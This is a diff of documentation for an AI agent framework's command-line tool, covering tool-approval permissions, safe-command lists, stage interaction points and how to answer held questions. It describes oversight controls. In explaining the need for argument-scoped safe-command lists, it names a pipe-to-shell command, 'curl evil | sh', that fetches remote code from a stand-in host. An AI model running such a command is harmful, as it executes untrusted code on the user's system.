@@ -30,7 +30,7 @@ sequenceDiagram
   participant H as Human
   A->>H: "ask_user_confirm: Delete the branch?"
   Note over A: run pauses, question is open
-  H-->>A: "lev respond <id> --approve"
+  H-->>A: "lev respond <id> yes"
   A->>A: "answer injected, run resumes"
 ```
 
@@ -102,23 +102,29 @@ opened with. Neither `lev setup` nor any bundled agent sets one for you.
 
 ## Tool approval
 
-Instead of the model asking, you can require approval for a tool before it runs. Set a tool's
-per-stage (or agent-level) permission to `ask`. The values are `allow`, `ask`, and `deny`:
+Instead of the model asking, you can require approval for a tool before it runs. Set the tool's
+permission to `ask`, for the whole blueprint under `[graph.tool_permissions]` or for one stage in
+that stage's `tool_permissions`. The values are `allow`, `ask`, and `deny`:
 
 ```toml
-[tool_permissions]
+[graph.tool_permissions]
 read_file  = "allow"
 write_file = "ask"     # pause and ask before each write
 bash       = "ask"
+
+[[graph.stages]]
+name = "review"
+tool_permissions = { bash = "allow" }   # this stage only
 ```
 
 ### What runs without asking
 
 `ask` is per tool name, which for the shell is a choice between a prompt on every `ls` and no
-prompt on `curl evil | sh`. `[safe_commands]` is the middle: entries are argument-scoped, and can
-only ever turn `ask` into `allow`, never a configured `deny`.
+prompt on `curl evil | sh`. `[safe_commands]` in your `config.toml` is the middle: entries are
+argument-scoped, and can only ever turn `ask` into `allow`, never a configured `deny`.
 
 ```toml
+# config.toml
 [safe_commands]
 defaults = true                # ship the read-only verb list, on unless you say otherwise
 tools = ["read_files"]
@@ -126,7 +132,7 @@ shell = ["cargo test", "rg"]   # `cargo test` never covers `cargo publish`
 
 [agent_safe_commands.coder]
 shell = ["./gradlew"]
-allow_blueprint = true         # honour this agent's own [safe_commands] block
+allow_blueprint = true         # honour this blueprint's own [graph.safe_commands]
 ```
 
 A shell entry is a program, optionally with the subcommand that narrows it, and it covers that
@@ -139,8 +145,15 @@ program, or open a network connection under any flag. That is why `find` (`-exec
 they look. Add any of them by name if you want them. `lev approvals safe` prints what is in effect
 and which file put it there.
 
-A blueprint may declare its own `[safe_commands]`, and like `[read_paths]` it is inert until you
-opt in, because otherwise any agent package could pre-approve its own shell with one TOML line.
+A blueprint may declare its own, as `[graph.safe_commands]` with `tools` and `shell` lists. Like
+the blueprint's `read_paths`, it is inert until you opt in, because otherwise any blueprint package
+could pre-approve its own shell with one TOML line.
+
+```toml
+# agent.toml
+[graph.safe_commands]
+shell = ["git log", "git diff"]
+```
 
 ### The prompt
 
@@ -154,10 +167,11 @@ command for `bash`/`shell`, the path for the file tools). The prompt offers five
 - **Deny**: reject the call. The model sees `[denied] User declined tool call 'bash'.` and
   decides for itself what to try next.
 - **Deny with feedback**: reject the call and say what to do instead. The dashboard opens the
-  response box for the text; `lev respond` takes it as `--feedback`; the API takes `feedback`.
+  response box for the text; `lev respond` takes it as `deny --feedback`; the API takes
+  `feedback`.
   The model sees `[denied] User declined tool call 'bash'. Feedback: <your text>` as the tool
   result, so its next turn starts from your redirect rather than from a guess. The text is in the
-  run's journal with the rest of the tool result.
+  run's record with the rest of the tool result.
 
 The two scoped options name what they grant, because a grant is not keyed on the tool. Approving
 `ls && git status` for the run grants `ls` and `git status`, not "the shell": a later
@@ -165,7 +179,9 @@ The two scoped options name what they grant, because a grant is not keyed on the
 approve `git push`. A line the parser cannot read as a list of commands (a backtick, a heredoc, an
 `eval`, a program named by a variable) has nothing reusable to grant, and the prompt says so.
 
-Nothing is written to disk. Every grant dies with the run that made it.
+A grant is kept in the run's own [run file](/docs/run-file), beside what the run has written
+against its write ceilings, so a run the daemon brings back after a restart keeps both. Nothing
+outside the run records it, and every grant dies with the run that made it.
 
 The taint gate in [security](/docs/security) uses the same prompt shape with its own wording. An
 outbound tool that would carry sensitive data above its clearance is blocked, then surfaced as a
@@ -191,13 +207,14 @@ That is the whole difference from the `ask_user` tools. Those only fire if the m
 them, so an agent that is confident and wrong sails past. An interaction point fires at the stage
 boundary every time, before the stage is allowed to move on.
 
-Set the stage's mode to `interactive_points` and list one or more:
+List one or more points as the stage's `mode`. Each `[[graph.stages.mode.interactive_points]]`
+entry belongs to the stage declared just above it:
 
 ```toml
-[stages.plan]
-mode = "interactive_points"
+[[graph.stages]]
+name = "plan"
 
-[[stages.plan.interaction_points]]
+[[graph.stages.mode.interactive_points]]
 name     = "plan_approval"
 prompt   = "Approve the plan?"
 required = true
@@ -262,8 +279,8 @@ You can steer a running agent without waiting for it to ask. A message is inject
 conversation region between inference calls, as if the user had spoken mid-turn:
 
 ```bash
-lev msg <agent-id> "Focus on the auth module first, skip the migrations for now."
-lev msg <agent-id> "the arm is still wrong, see @marked_up.png" --attach notes.md:brief
+lev msg <run-id> "Focus on the auth module first, skip the migrations for now."
+lev msg <run-id> "the arm is still wrong, see @marked_up.png" --attach notes.md:brief
 ```
 
 A message can carry files. A `@path` in the text and every `--attach` become typed
@@ -277,8 +294,8 @@ Whether a message lands right away is per-stage. `accepts_messages` defaults to 
 the agent's inbox until it reaches a stage that accepts them:
 
 ```toml
-[stages.report]
-mode = "autonomous"
+[[graph.stages]]
+name = "report"
 accepts_messages = false   # hold messages until a later stage that accepts them
 ```
 
@@ -288,28 +305,37 @@ accepts_messages = false   # hold messages until a later stage that accepts them
 
 ## Answering questions
 
-When a run is waiting on a question, `lev interactions` lists what the daemon is holding, and
-`lev interactions <request-id>` shows one in full without answering it. Answer it with
-`lev respond`:
+When a run is waiting on a question, `lev interactions` lists what the daemon is holding, each
+option numbered from 1 beside the word that answers with it. `lev interactions <request-id>` shows
+one in full without answering it. Answer with what the question shows:
 
 ```bash
 lev interactions                         # list open interactions
 lev interactions <request-id>            # show one in full, with the line that answers it
-lev respond <request-id> "your answer"   # free-text / edited value
-lev respond <request-id> --choice 1      # multiple-choice, 0-based index
-lev respond <request-id> --approve       # tool-approval / confirm
-lev respond <request-id> --approve --stage     # and every later call this covers, this stage
-lev respond <request-id> --approve --session   # and every later call this covers, this run
-lev respond <request-id> --deny          # reject
-lev respond <request-id> --deny --feedback "use git log, not git show"   # reject and redirect
+lev respond <request-id> allow           # tool approval: allow, allow-stage, allow-run or deny
+lev respond <request-id> deny --feedback "use git log, not git show"   # reject and redirect
+lev respond <request-id> yes             # confirm: yes or no
+lev respond <request-id> postgres        # multiple choice: the option, or the start of it
+lev respond <request-id> 2               # any of those three, by the number it is listed under
+lev respond <request-id> "your answer"   # free-text / edited value, exactly as written
 lev respond <request-id> "the arm is still wrong, see @marked_up.png"    # a text answer with a file
 lev respond <request-id> "here" --attach sketch.png:sprites                # or attached by flag
 ```
 
+The question's kind decides how the answer is read, so a number answers a free-text question with
+that number as its text. The older flags still work: `--approve` and `--deny` (with `--stage`,
+`--session` or `--feedback`), and `--choice N`, which counts from 0 over the same listing for any
+question with options.
+
 `lev respond` always needs the answer itself. Naming a question is not answering it, and an
 answer with nothing in it reads to the run like nobody answered, so it is refused. So is an answer
-the question can't take, such as text for a tool approval or `--choice 7` on a list of three. The
-refusal names the flag that would answer it, and the question stays open.
+the question can't take. The refusal lists every answer that would work, and the question stays
+open:
+
+```
+"maybe" is not an answer to this approval; answer allow, allow-stage, allow-run, deny or
+deny-feedback (or 1-5)
+```
 
 A request id is opaque, and it names the run that asked: two runs stopped on the same tool call are
 two questions with two ids, and answering one says nothing about the other.
@@ -318,7 +344,7 @@ The id can be cut short. `lev respond` takes the start of one, as long as that s
 one open interaction:
 
 ```bash
-lev respond probe-1789971553 --approve   # the whole id is probe-1789971553-793b8652da33-approve-1
+lev respond probe-1789971553 allow   # the whole id is probe-1789971553-793b8652da33-approve-1
 ```
 
 Since the run comes first in an id, the run's own id is usually short enough on its own. A start
@@ -336,16 +362,40 @@ tail is the part two runs are most likely to share. An id given in full answers 
 whatever longer ids begin with it, and a start that fits nothing is `no such open interaction`, the
 same as an id that was never open.
 
+### A question on a held run
+
+The daemon holds a run off the machine when it cannot place it as things stand, such as when the
+provider the run uses was taken out of the config. A question that run was waiting on can't be
+answered while it is held. `lev interactions` lists it under the open ones, marked `[held]`, with
+what to put back:
+
+```
+coder-1788924523-abc123-ask-1  [held]  agent=coder-1788924523-abc123
+  What colour?
+  held: 'coder-1788924523-abc123-ask-1' was asked by run 'coder-1788924523-abc123', which this
+  machine cannot take back as it stands, so nothing can answer it yet: configure 'openai' again,
+  then `lev resume` this run. Once the run is back, the question reopens under a new id
+```
+
+`lev respond` and `lev interactions <id>` on it give that same reason instead of `no such open
+interaction`. Put back what it names and resume the run, or restart the daemon. The run asks the
+question again under a new id, and that one is answered as usual. `lev interactions --json` lists
+only questions that can be answered, so a held one is not in it.
+
+The API and GraphQL say the same. Reading or answering it over REST is a `409` whose `error` is
+the reason above. GraphQL lists it in `heldInteractions` rather than `openInteractions`, and
+`answerInteraction` on it fails with the code `RUN_HELD`.
+
 A text answer carries files the way a message does. Every `--attach` and every `@path` in the
 words become typed [parts](/docs/mime) stored by the run, and written beside the answer in the
 tool result. The model reads the file where the words mention it. A choice or an approval has
 no text for a file to sit beside, and `--attach` on one is refused. The dashboard and the API take
 the same: a `@path` in a typed reply, and `parts` or a multipart upload on
-`POST /api/agents/{id}/interaction`.
+`POST /api/runs/{id}/interaction`.
 
 You don't have to use the CLI. The same open questions can be answered interactively from the
 [dashboard](/docs/dashboard) (press `i`), from [The Lair](https://leviath.dev/lair), or over the
-[API](/docs/api) via `GET/POST /api/agents/{id}/interaction`: read the pending question, then post
+[API](/docs/api) via `GET/POST /api/runs/{id}/interaction`: read the pending question, then post
 the answer.
 
 > [!NOTE]
